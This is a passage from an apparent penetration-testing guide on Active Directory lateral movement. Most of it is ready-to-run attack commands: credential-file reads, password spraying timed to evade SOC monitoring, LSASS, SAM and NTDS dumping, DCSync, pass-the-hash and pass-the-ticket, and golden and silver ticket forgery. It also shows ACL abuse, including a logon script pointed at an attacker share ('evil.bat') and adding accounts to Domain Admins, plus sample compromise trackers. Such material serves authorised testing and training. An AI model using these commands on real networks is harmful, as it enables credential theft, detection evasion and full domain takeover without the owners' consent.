# Linux - LaZagne
python laZagne.py all

# Linux - Manual extraction
cat /etc/passwd
sudo cat /etc/shadow
history
cat ~/.bash_history
find / -name "*.conf" -exec grep -i "password" {} \; 2>/dev/null
```

### 4.2 Targeted Password Spraying

**Pre-Spraying Reconnaissance**

```bash
# Enumerate password policy
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --pass-pol
enum4linux -P 10.11.1.10

# LDAP password policy
ldapsearch -x -h 10.11.1.10 -s base -b "" "(objectClass=*)" defaultNamingContext
ldapsearch -x -h 10.11.1.10 -s sub -b "DC=domain,DC=local" "(objectClass=domain)" pwdProperties lockoutThreshold lockoutDuration

# PowerShell password policy
Get-ADDefaultDomainPasswordPolicy
net accounts /domain
```

**SMB Spraying with CrackMapExec**

```bash
# Single password against user list
crackmapexec smb 10.11.1.0/24 -u users.txt -p 'Summer2024!'
cme smb 10.11.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# Multiple passwords against single user
crackmapexec smb 10.11.1.0/24 -u administrator -p passwords.txt
cme smb 10.11.1.0/24 -u administrator -p passwords.txt

# With domain context
crackmapexec smb 10.11.1.0/24 -d domain.local -u users.txt -p 'Password123'
cme smb 10.11.1.0/24 -d domain.local -u users.txt -p 'Password123' --continue-on-success

# Noisy but comprehensive
crackmapexec smb 10.11.1.0/24 -u users.txt -p passwords.txt --continue-on-success
cme smb 10.11.1.0/24 -u users.txt -p passwords.txt --no-bruteforce

# Check for local admin access
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --local-auth
cme smb 10.11.1.0/24 -u users.txt -p 'Password123' --local-auth

# Export results
crackmapexec smb 10.11.1.0/24 -u users.txt -p 'Password123' --continue-on-success | tee spray_results.txt
```

**Kerbrute for Kerberos Spraying**

```bash
# User enumeration
kerbrute userenum -d domain.local --dc 10.11.1.10 users.txt

# Password spraying
kerbrute passwordspray -d domain.local --dc 10.11.1.10 users.txt 'Password123'

# With verbose output
kerbrute passwordspray -d domain.local --dc 10.11.1.10 users.txt 'Password123' -v

# Brute force single user
kerbrute bruteuser -d domain.local --dc 10.11.1.10 passwords.txt username
```

**WinRM Spraying**

```bash
# CrackMapExec WinRM
crackmapexec winrm 10.11.1.0/24 -u users.txt -p 'Winter2024!'
cme winrm 10.11.1.0/24 -d domain.local -u users.txt -p 'Password123'

# Metasploit WinRM spray
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.11.1.0/24
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**SSH Spraying**

```bash
# Hydra for SSH spraying
hydra -L users.txt -p 'Spring2024!' ssh://10.11.2.0/24 -t 4
hydra -L users.txt -P passwords.txt ssh://10.11.2.10 -t 4

# Specific port
hydra -L users.txt -p 'Summer2024!' -s 2222 ssh://10.11.2.10

# With output file
hydra -L users.txt -p 'Autumn2024!' ssh://10.11.2.0/24 -o ssh_spray_results.txt

# Single user, multiple passwords
hydra -l root -P passwords.txt ssh://10.11.2.10

# Verbose mode
hydra -L users.txt -p 'Password123' ssh://10.11.2.10 -V

# Resume session
hydra -L users.txt -P passwords.txt ssh://10.11.2.10 -R
```

**Medusa for Multi-Protocol Spraying**

```bash
# SSH spraying
medusa -h 10.11.2.10 -U users.txt -p 'Password123' -M ssh

# FTP spraying
medusa -h 10.11.2.10 -U users.txt -P passwords.txt -M ftp

# SMB spraying
medusa -h 10.11.1.10 -U users.txt -p 'Password123' -M smbnt

# MySQL spraying
medusa -h 10.11.2.50 -U users.txt -P passwords.txt -M mysql

# Multiple hosts
medusa -H hosts.txt -U users.txt -p 'Password123' -M ssh
```

**RDP Spraying**

```bash
# Crowbar for RDP spraying
crowbar -b rdp -s 10.11.1.0/24 -u users.txt -c 'Password123'
crowbar -b rdp -s 10.11.1.30 -u administrator -C passwords.txt

# With specific domain
crowbar -b rdp -s 10.11.1.30 -u administrator -C passwords.txt -d domain.local

# Hydra RDP
hydra -L users.txt -p 'Password123' rdp://10.11.1.30

# Ncrack RDP
ncrack -vv --user administrator -P passwords.txt rdp://10.11.1.30
```

**LDAP Spraying**

```bash
# ldapsearch authentication test
for user in $(cat users.txt); do
    ldapsearch -x -h 10.11.1.10 -D "$user@domain.local" -w 'Password123' -b "DC=domain,DC=local" "(objectClass=*)" dn 2>&1 | grep -q "Success" && echo "[+] Valid: $user:Password123"
done

# ldapdomaindump with credentials
ldapdomaindump -u 'domain\user' -p 'Password123' 10.11.1.10
```

**Web Application Spraying**

```bash
# Hydra HTTP-POST
hydra -L users.txt -p 'Password123' 10.11.1.50 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Burp Intruder alternative - wfuzz
wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2Z" http://10.11.1.50/login

# Patator for web spraying
patator http_fuzz url=http://10.11.1.50/login method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'
```

### 4.3 Spraying Safety Measures

**Lockout Prevention**

```bash
# Check account lockout policy first
crackmapexec smb 10.11.1.10 -u user -p 'Password123' --pass-pol
net accounts /domain

# Slow spraying to avoid detection
crackmapexec smb 10.11.1.0/24 -u users.txt -p 'Password123' --delay 1000
hydra -L users.txt -p 'Password123' ssh://10.11.2.10 -t 1 -w 10

# Limited attempts per host
crackmapexec smb 10.11.1.0/24 -u users.txt -p passwords.txt --limit 3

# Test single account first
crackmapexec smb 10.11.1.30 -u testuser -p 'Password123'

# One password at a time across all users
for password in $(cat passwords.txt); do
    echo "[*] Trying password: $password"
    crackmapexec smb 10.11.1.0/24 -u users.txt -p "$password" --continue-on-success
    sleep 300  # Wait 5 minutes between attempts
done
```

**Timing Considerations**

```markdown
## ⏰ Optimal Spraying Times

### 🕒 Business Hours (9 AM - 5 PM)
**Pros:**
- More users logged in
- Normal authentication traffic (blends in)
- Higher success rate for credential harvesting

**Cons:**
- More noise and potential for detection
- SOC analysts actively monitoring
- Risk of user reports

### 🌙 After Hours (6 PM - 8 AM)
**Pros:**
- Less noise and detection risk
- Fewer IT staff monitoring
- More time before discovery

**Cons:**
- Fewer active sessions to harvest
- Limited opportunity for immediate exploitation
- Unusual authentication patterns may stand out

### 📅 Weekends
**Pros:**
- Minimal IT staff presence
- Lower chance of real-time detection
- Extended window for exploitation

**Cons:**
- Very few active users
- Limited administrative activity
- Unusual patterns may trigger automated alerts

### 🎯 Recommended Approach
- **Reconnaissance Phase**: Business hours (blend with normal traffic)
- **Initial Spray**: Early morning (6-8 AM) or late evening (6-8 PM)
- **Follow-up**: After successful initial spray, during low-activity periods
- **Rate**: 1 password every 30-60 minutes across all users
```

**Spray Documentation**

```markdown
## 📊 Spraying Campaign Tracker

| Date/Time | Target Scope | Password | Success Count | Lockouts | Notes |
|-----------|-------------|----------|---------------|----------|-------|
| 2024-01-15 08:00 | 10.11.1.0/24 | Winter2024! | 3/50 | 0 | Web servers group |
| 2024-01-15 10:30 | 10.11.1.0/24 | Password123 | 7/50 | 1 | One admin account locked |
| 2024-01-15 14:00 | 10.11.2.0/24 | Summer2024! | 2/30 | 0 | Linux systems |
```

---

## 5 AD-Specific Lateral Movement

### 5.1 Pass-the-Hash (PtH) Strategy

**Understanding Pass-the-Hash**

```markdown
Pass-the-Hash allows authentication using NTLM hash without knowing the plaintext password.

Requirements:
- NTLM hash of the target account
- Target must accept NTLM authentication
- Account must have appropriate permissions on target system

Limitations:
- Does not work for domain-joined Azure AD accounts
- May not work if NTLMv2 is required
- Blocked by some security configurations
```

**Target Selection for PtH**

```bash
# Find systems where user has local admin
crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH --local-auth
cme smb 10.11.1.0/24 -u user -H NTLM_HASH
```

### 5.2 Pass-the-Ticket (PtT) Movement

**Understanding Kerberos Tickets**

```markdown
## Ticket Types
- **TGT (Ticket Granting Ticket)**: Used to request service tickets
- **TGS (Ticket Granting Service)**: Service-specific ticket
- **Golden Ticket**: Forged TGT with krbtgt hash (persistent)
- **Silver Ticket**: Forged TGS for specific service (stealthy)

## Ticket Formats
- **.kirbi**: Windows Mimikatz/Rubeus format
- **.ccache**: Linux format (Impacket)
```

**Ticket Harvesting (Windows)**

```powershell
# Mimikatz ticket export
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

# Export all tickets
mimikatz # kerberos::list /export

# Rubeus ticket harvesting
.\Rubeus.exe triage
.\Rubeus.exe dump
.\Rubeus.exe dump /luid:0x3e7 /nowrap

# Continuous harvesting
.\Rubeus.exe harvest /interval:30

# Monitor for specific user tickets
.\Rubeus.exe monitor /interval:5 /filteruser:administrator

# PowerShell ticket extraction
klist
klist purge
klist tgt
```

**Ticket Harvesting (Linux)**

```bash
# From keytab files
find / -name "*.keytab" 2>/dev/null
klist -k /path/to/file.keytab

# From ccache files
find / -name "*.ccache" 2>/dev/null
find /tmp -name "krb5cc_*" 2>/dev/null

# Export Kerberos ticket
export KRB5CCNAME=/tmp/krb5cc_1000

# List current tickets
klist

# Impacket ticket extraction from Windows
impacket-secretsdump domain.local/user:password@10.11.1.10 -just-dc-user krbtgt
```

**Ticket Conversion**

```bash
# Convert .kirbi to .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache
ticketConverter.py ticket.kirbi ticket.ccache

# Convert .ccache to .kirbi
impacket-ticketConverter ticket.ccache ticket.kirbi

# Base64 encode/decode tickets (Rubeus format)
cat ticket.kirbi | base64 -w 0
echo "BASE64_TICKET" | base64 -d > ticket.kirbi
```

**Pass-the-Ticket Usage (Windows)**

```powershell
# Mimikatz PtT
mimikatz # kerberos::ptt admin_ticket.kirbi

# Multiple tickets
mimikatz # kerberos::ptt "C:\tickets\*.kirbi"

# Rubeus PtT
.\Rubeus.exe ptt /ticket:admin_ticket.kirbi

# Rubeus with base64 ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Verify ticket injection
klist

# Use injected ticket
dir \\dc01.domain.local\C$
Enter-PSSession -ComputerName dc01.domain.local
```

**Pass-the-Ticket Usage (Linux)**

```bash
# Set ticket for use
export KRB5CCNAME=/path/to/admin_ticket.ccache

# Verify ticket
klist

# Use with Impacket
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local

impacket-wmiexec -k -no-pass domain.local/administrator@dc01.domain.local
impacket-smbexec -k -no-pass domain.local/administrator@dc01.domain.local

# SMB access with ticket
impacket-smbclient -k -no-pass domain.local/administrator@dc01.domain.local
smbclient.py -k -no-pass //dc01.domain.local/C$ -k

# Get remote shell
impacket-psexec -k -no-pass domain.local/administrator@dc01.domain.local

# DCSync with ticket
impacket-secretsdump -k -no-pass domain.local/administrator@dc01.domain.local
```

**Golden Ticket Creation**

```powershell
# Mimikatz Golden Ticket
# First, get krbtgt hash via DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Create Golden Ticket
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /ptt

# With specific groups
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /groups:512,513,518,519,520 /ptt

# Save to file
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /user:Administrator /id:500 /ticket:golden.kirbi

# Rubeus Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /user:Administrator /ptt

# Impacket Golden Ticket
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local Administrator

export KRB5CCNAME=Administrator.ccache
```

**Silver Ticket Creation**

```powershell
# Mimikatz Silver Ticket (CIFS service)
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /target:server01.domain.local /service:cifs /rc4:SERVICE_NTLM_HASH /user:Administrator /ptt

# Other services
# HTTP: /service:http
# LDAP: /service:ldap
# HOST: /service:host
# MSSQL: /service:mssqlsvc

# Rubeus Silver Ticket
.\Rubeus.exe silver /service:cifs/server01.domain.local /rc4:SERVICE_NTLM_HASH /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /ldap /user:Administrator /domain:domain.local /ptt

# Impacket Silver Ticket
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local -spn cifs/server01.domain.local Administrator
```

### 5.3 Admin Session Exploitation

**Session Enumeration**

```powershell
# Current logged on users (local)
query user
query session
qwinsta

# Remote session enumeration
query user /server:10.11.1.30
qwinsta /server:10.11.1.30

# Net commands
net session
net session \\10.11.1.30

# WMI session enumeration
Get-WmiObject -Class Win32_LoggedOnUser -ComputerName 10.11.1.30
Get-WmiObject -Class Win32_ComputerSystem -ComputerName 10.11.1.30 | Select-Object UserName

# CIM session
Get-CimInstance -ClassName Win32_LoggedOnUser -ComputerName 10.11.1.30

# PowerView session checking
Import-Module .\PowerView.ps1
Get-NetSession -ComputerName 10.11.1.30
Get-NetLoggedon -ComputerName 10.11.1.30
Invoke-UserHunter
Invoke-UserHunter -ComputerName 10.11.1.30
Invoke-UserHunter -GroupName "Domain Admins"

# Find admin sessions
Find-DomainUserLocation
Find-DomainUserLocation -UserIdentity administrator

# SharpHound session collection
.\SharpHound.exe -c Session,LoggedOn
.\SharpHound.exe --CollectionMethods Session
```

**Linux Session Enumeration**

```bash
# CrackMapExec session enumeration
crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --sessions
cme smb 10.11.1.0/24 -u user -p 'Password123' --sessions

# Impacket session enumeration
impacket-lookupsid domain.local/user:password@10.11.1.10
lookupsid.py domain.local/user:password@10.11.1.10

# NetExec (formerly CrackMapExec fork)
netexec smb 10.11.1.0/24 -u user -p 'Password123' --sessions

# Enum4linux session enumeration
enum4linux -a 10.11.1.10
```

**LSASS Dumping for Credential Harvesting**

```bash
# Remote LSASS dump with CrackMapExec
crackmapexec smb 10.11.1.30 -u admin -p Password123 --lsa
cme smb 10.11.1.30 -u admin -p Password123 --lsa

# Dump SAM remotely
crackmapexec smb 10.11.1.30 -u admin -p Password123 --sam
cme smb 10.11.1.30 -u admin -p Password123 --sam

# Dump LSA secrets
crackmapexec smb 10.11.1.30 -u admin -p Password123 --lsa
cme smb 10.11.1.30 -u admin -p Password123 --lsa --no-output

# Mass credential dumping
crackmapexec smb 10.11.1.0/24 -u admin -p Password123 --lsa --continue-on-success
cme smb 10.11.1.0/24 -u admin -p Password123 --sam --continue-on-success

# NTDS.dit extraction
crackmapexec smb 10.11.1.20 -u admin -p Password123 --ntds
cme smb 10.11.1.20 -u admin -p Password123 --ntds --user Administrator

# Impacket secretsdump
impacket-secretsdump domain.local/admin:Password123@10.11.1.30
secretsdump.py domain.local/admin:Password123@10.11.1.30

# Dump NTDS from DC
impacket-secretsdump domain.local/admin:Password123@10.11.1.20 -just-dc
secretsdump.py domain.local/admin:Password123@10.11.1.20 -just-dc-ntlm

# Dump specific user
secretsdump.py domain.local/admin:Password123@10.11.1.20 -just-dc-user Administrator

# DCSync attack
secretsdump.py domain.local/admin:Password123@10.11.1.20 -just-dc-user krbtgt

# Extract from local SAM/SYSTEM files
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Extract from NTDS.dit
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**LSASS Dumping (Windows)**

```powershell
# Task Manager method
# Right-click lsass.exe -> Create dump file

# ProcDump
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Comsvcs.dll method
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\temp\lsass.dmp full

# PowerShell
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\

# Mimikatz direct
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::ekeys

# Parse dump offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Pypykatz (parse on Linux)
pypykatz lsa minidump lsass.dmp
```

**Token Impersonation**

```powershell
# List available tokens
mimikatz # token::list
mimikatz # token::elevate

# Impersonate domain admin token
mimikatz # token::elevate /domainadmin

# Incognito (Metasploit)
load incognito
list_tokens -u
impersonate_token DOMAIN\\Administrator

# PowerShell
Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\admin"
Invoke-TokenManipulation -Enumerate

# Rubeus token manipulation
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e7
```

### 5.4 BloodHound-Informed Movement

**BloodHound Data Collection**

```powershell
# SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --zipfilename output.zip
.\SharpHound.exe -c All,GPOLocalGroup
.\SharpHound.exe --CollectionMethods All
.\SharpHound.exe --CollectionMethods Session,Trusts,ACL,ObjectProps,RDP,DCOM,LocalGroups
.\SharpHound.exe --stealth --outputdirectory C:\temp\

# PowerShell SharpHound
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -Domain domain.local -LdapUsername user -LdapPassword Password123

# AzureHound (for Azure AD)
.\azurehound.exe -u "user@domain.com" -p "Password123" list --tenant "tenant-id" -o output.json
```

**BloodHound Data Collection (Linux)**

```bash
# BloodHound.py
bloodhound-python -c All -u user -p Password123 -d domain.local -ns 10.11.1.10
bloodhound-python -c All -u user -p Password123 -d domain.local -dc dc01.domain.local -ns 10.11.1.10

# Specific collection methods
bloodhound-python -c DCOnly -u user -p Password123 -d domain.local -ns 10.11.1.10

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python -c All -k -d domain.local -dc dc01.domain.local -ns 10.11.1.10

# Output to specific directory
bloodhound-python -c All -u user -p Password123 -d domain.local -ns 10.11.1.10 --zip -o /tmp/
```

**BloodHound Analysis Queries**

```cypher
# Find shortest path to Domain Admins
MATCH (m:Computer),(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}),p=shortestPath((m)-[*1..]->(n)) RETURN p

# Find systems where Domain Admins have sessions
MATCH (c:Computer)-[r:HasSession]->(u:User)-[r2:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN c.name

# Find users with DCSync rights
MATCH (u:User)-[r:GetChanges|GetChangesAll]->(d:Domain) RETURN u.name

# Find Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalname

# Find AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

# Find users with admin rights on computers
MATCH (u:User)-[r:AdminTo]->(c:Computer) RETURN u.name, c.name

# Find computers with sessions from high-value targets
MATCH (c:Computer)-[r:HasSession]->(u:User {highvalue:true}) RETURN c.name, u.name

# Find GPO paths to compromise
MATCH p=(g:GPO)-[r:GpLink]->(o:OU) RETURN p

# Find who can RDP to what
MATCH (u:User)-[r:CanRDP]->(c:Computer) RETURN u.name, c.name

# Find who can PS Remote to what
MATCH (u:User)-[r:CanPSRemote]->(c:Computer) RETURN u.name, c.name

# Find objects owned by users
MATCH (u:User)-[r:Owns]->(o) RETURN u.name, o.name, labels(o)

# Find ACL attack paths
MATCH (u:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(o) RETURN u.name, type(r), o.name

# Find computers where current user has admin
MATCH (u:User {name:"USER@DOMAIN.LOCAL"})-[r:AdminTo]->(c:Computer) RETURN c.name
```

**Path-Based Targeting**

```powershell
# PowerView queries based on BloodHound findings
Import-Module .\PowerView.ps1

# Find computers with admin sessions
Get-DomainComputer | Get-NetSession | Where-Object {$_.UserName -like "*admin*"}

# Find computers where specific user has session
Find-DomainUserLocation -UserIdentity "administrator"

# Find local admin access
Find-LocalAdminAccess
Find-LocalAdminAccess -ComputerName "server01.domain.local"

# Check ACLs for specific object
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find modifiable GPOs
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}

# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Find users with constrained delegation
Get-DomainUser -TrustedToAuth

# Find principals with DCSync rights
Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" -ResolveGUIDs | Where-Object {($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll')}
```

**ACL-Based Movement**

```powershell
# GenericAll abuse
# If you have GenericAll on a user
net user target_user NewPassword123! /domain

# Set SPN for Kerberoasting
setspn -s HTTP/fake.domain.local target_user

# If you have GenericAll on a computer
# Add computer to domain (requires computer account)

# GenericWrite abuse
# Set script path for user
Set-ADUser -Identity target_user -ScriptPath "\\attacker\share\evil.bat"

# WriteOwner abuse
# Change owner
Set-DomainObjectOwner -Identity target_user -OwnerIdentity attacker_user

# WriteDacl abuse
# Add GenericAll rights for yourself
Add-DomainObjectAcl -TargetIdentity target_user -PrincipalIdentity attacker_user -Rights All

# ForceChangePassword
$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-ADAccountPassword -Identity target_user -NewPassword $NewPassword -Reset

# AddMembers (Group)
Add-ADGroupMember -Identity "Domain Admins" -Members attacker_user
net group "Domain Admins" attacker_user /add /domain

# ReadLAPSPassword
Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd

# AllExtendedRights
# Can do anything - similar to GenericAll
```

---

## 6 Progress Tracking and Documentation

### 6.1 Centralized Movement Dashboard

**Movement Tracking Database:**

```markdown
## 🔄 Lateral Movement Dashboard

### 🎯 High-Value Targets
| Target | IP | Access Method | Credentials | Status | Next Steps |
|--------|----|---------------|-------------|--------|------------|
| DC01 | 10.11.1.20 | DCSync | krbtgt hash | ✅ Compromised | Golden Ticket |
| SQL01 | 10.11.1.25 | WinRM | sqlservice | ✅ Compromised | DB credential harvest |
| FS01 | 10.11.1.30 | SMB PtH | backup_ops | � ️ Limited | Local privilege escalation |
| EXCH01 | 10.11.1.35 | RDP | admin | ⏳ In Progress | PrivExchange exploitation |
| WEB01 | 10.11.1.40 | SSH | webadmin | ✅ Compromised | Pivot to internal network |

### 📊 Access Matrix
| Host | SMB | WinRM | RDP | SSH | WMI | Notes |
|------|-----|-------|-----|-----|-----|-------|
| 10.11.1.5 | ✅ | ✅ | ❌ | ❌ | ✅ | Web server |
| 10.11.1.15 | ✅ | ❌ | ✅ | ❌ | ✅ | User workstation |
| 10.11.1.20 | ✅ | ✅ | ✅ | ❌ | ✅ | Domain Controller |
| 10.11.1.25 | ✅ | ✅ | ❌ | ❌ | ✅ | SQL server |
| 10.11.2.10 | ❌ | ❌ | ❌ | ✅ | ❌ | Linux file server |
| 10.11.2.20 | ❌ | ❌ | ❌ | ✅ | ❌ | Linux web app |

### 🔑 Credential Reuse Results
| Credential | Success Rate | High-Value Systems | Protocol | Notes |
|------------|-------------|-------------------|----------|-------|
| domain\sqlservice:Pass123 | 3/3 SQL servers | SQL01, SQL02, SQL03 | SMB, WinRM | Service account |
| local\admin:Summer2024! | 5/8 workstations | WS01, WS03, WS05, WS07, WS09 | RDP, SMB | Local admin reuse |
| root:ssh_key | 8/15 Linux hosts | Multiple | SSH | Shared root key |
| domain\administrator:NTLM | 2/2 servers | FS01, BACKUP01 | SMB PtH | Hash reuse |

### 🌐 Network Segments Accessed
| Segment | CIDR | Systems | Access Level | Entry Point |
|---------|------|---------|-------------|-------------|
| DMZ | 10.11.1.0/24 | 15 hosts | Full control | Initial foothold |
| Internal | 10.11.2.0/24 | 30 hosts | Partial | Pivot from WEB01 |
| Management | 10.11.3.0/24 | 5 hosts | Limited | Jump server |
| Database VLAN | 10.11.4.0/24 | 3 hosts | Recon only | Network scanning |

### 📋 Session Inventory
| Username | Domain Role | Active Sessions | Last Seen | Target Priority |
|----------|------------|----------------|-----------|-----------------|
| administrator | Domain Admin | DC01, EXCH01 | 2024-01-15 10:00 | 🔴 Critical |
| sqlservice | Service Account | SQL01, SQL02, SQL03 | 2024-01-15 09:30 | �  High |
| backup_ops | Backup Operators | FS01, BACKUP01 | 2024-01-15 08:00 | 🟡 Medium |
| webadmin | Local Admin (web) | WEB01, WEB02 | 2024-01-15 11:00 | 🟢 Low |
```

**Compromise Timeline**

```markdown
## ⏱️ Compromise Timeline

| Time | Event | System | Method | Outcome |
|------|-------|--------|--------|---------|
| 08:00 | Initial access | WEB01 (10.11.1.40) | RCE exploit | Shell as www-data |
| 08:15 | Privilege escalation | WEB01 | Kernel exploit | Root access |
| 08:30 | Credential harvest | WEB01 | SSH keys, history | Found 3 SSH keys |
| 08:45 | Lateral movement | WS05 (10.11.1.15) | SSH key reuse | User access |
| 09:00 | Privilege escalation | WS05 | Stored credentials | Local admin |
| 09:15 | LSASS dump | WS05 | ProcDump | 5 NTLM hashes |
| 09:30 | Lateral movement | SQL01 (10.11.1.25) | Pass-the-Hash | sqlservice access |
| 10:00 | Session hijacking | DC01 (10.11.1.20) | Admin session found | Domain admin token |
| 10:15 | Domain compromise | DC01 | DCSync | krbtgt hash acquired |
| 10:30 | Golden ticket | All systems | Forged TGT | Full domain control |
```

### 6.2 Next Target Prioritization

**Target Priority Matrix:**

```markdown
## 🎯 Target Prioritization Framework

### 🥇 Tier 1: Immediate Value (Priority 1-3)
**Characteristics:**
- Domain Controllers
- Certificate Authorities (AD CS)
- Credential management systems (CyberArk, password vaults)
- Backup servers with domain backup

**Rationale:** Direct path to domain compromise or credential access

**Example Targets:**
1. DC01.domain.local - Domain Controller
2. CA01.domain.local - Certificate Authority
3. VAULT01.domain.local - CyberArk server

### 🥈 Tier 2: High Value (Priority 4-7)
**Characteristics:**
- Database servers (MSSQL, MySQL, PostgreSQL)
- File servers with sensitive data
- Exchange/Email servers
- Application servers with business logic
- SCCM/WSUS servers

**Rationale:** Data access, additional credentials, infrastructure control

**Example Targets:**
4. SQL01.domain.local - Production database
5. EXCH01.domain.local - Exchange server
6. FS01.domain.local - Primary file server
7. SCCM01.domain.local - Systems management

### 🥉 Tier 3: Medium Value (Priority 8-12)
**Characteristics:**
- Management/Jump servers
- Monitoring systems (SIEM, logging)
- Development servers
- Web application servers
- Virtualization management (vCenter)

**Rationale:** Pivot points, monitoring evasion, additional attack surface

**Example Targets:**
8. JUMP01.domain.local - Administrative jump server
9. VCENTER01.domain.local - VMware management
10. DEV01.domain.local - Development server
11. SPLUNK01.domain.local - SIEM server
12. APP01.domain.local - Business application

### 📋 Tier 4: Low Value (Priority 13+)
**Characteristics:**
- Standard user workstations
- Print servers
- Guest networks
- IoT devices
- Non-domain systems

**Rationale:** Limited strategic value, used for breadth or specific scenarios

**Example Targets:**
13. WS-USER01 through WS-USER50 - Workstations
14. PRINT01 - Print server
15. GUEST-AP01 - Guest wireless
```

**Decision Factors Framework:**

```markdown
## 🤔 Target Selection Decision Matrix

### Network Position (Weight: 25%)
- **Central Hub (5 pts)**: Has connections to multiple network segments
- **Gateway (4 pts)**: Bridges different security zones
- **Endpoint (3 pts)**: Isolated or minimal connections
- **DMZ (2 pts)**: Externally facing, limited internal access
- **Isolated (1 pt)**: Air-gapped or heavily restricted

### Access Level (Weight: 30%)
- **Domain Admin (5 pts)**: Full domain control
- **Local Admin (4 pts)**: Local system control
- **Privileged User (3 pts)**: Elevated but limited rights
- **Standard User (2 pts)**: Normal user access
- **Guest/Limited (1 pt)**: Minimal permissions

### Data Sensitivity (Weight: 25%)
- **Critical (5 pts)**: PII, financial, IP, credentials
- **High (4 pts)**: Business-sensitive data
- **Medium (3 pts)**: Internal documentation
- **Low (2 pts)**: General information
- **Public (1 pt)**: No sensitive data

### Connectivity (Weight: 15%)
- **Very High (5 pts)**: Connects to 10+ high-value systems
- **High (4 pts)**: Connects to 5-9 systems
- **Medium (3 pts)**: Connects to 3-4 systems
- **Low (2 pts)**: Connects to 1-2 systems
- **Minimal (1 pt)**: Isolated or single connection

### Time Investment (Weight: 5%)
- **Quick (5 pts)**: <30 minutes to compromise
- **Fast (4 pts)**: 30-60 minutes
- **Moderate (3 pts)**: 1-3 hours
- **Slow (2 pts)**: 3-8 hours
- **Extended (1 pt)**: >8 hours

### Example Calculation:
**Target: SQL01.domain.local**
- Network Position: Central Hub (5 pts × 0.25 = 1.25)
- Access Level: Local Admin (4 pts × 0.30 = 1.20)
- Data Sensitivity: Critical (5 pts × 0.25 = 1.25)
- Connectivity: High (4 pts × 0.15 = 0.60)
- Time Investment: Fast (4 pts × 0.05 = 0.20)
- **Total Score: 4.50 / 5.00** → High Priority Target
```

**Attack Path Visualization**

```markdown
## 🗺️ Attack Path Map

### Current Position
```

[Attacker] ↓ [WEB01] ← Initial Foothold (RCE) ↓ (SSH key reuse) [WS05] ← Workstation compromise ↓ (Pass-the-Hash) [SQL01] ← Database server ↓ (Admin session token) [DC01] ← Domain Controller → FULL DOMAIN COMPROMISE

```

### Identified Paths to Critical Targets

**Path 1: Direct Domain Admin**
```

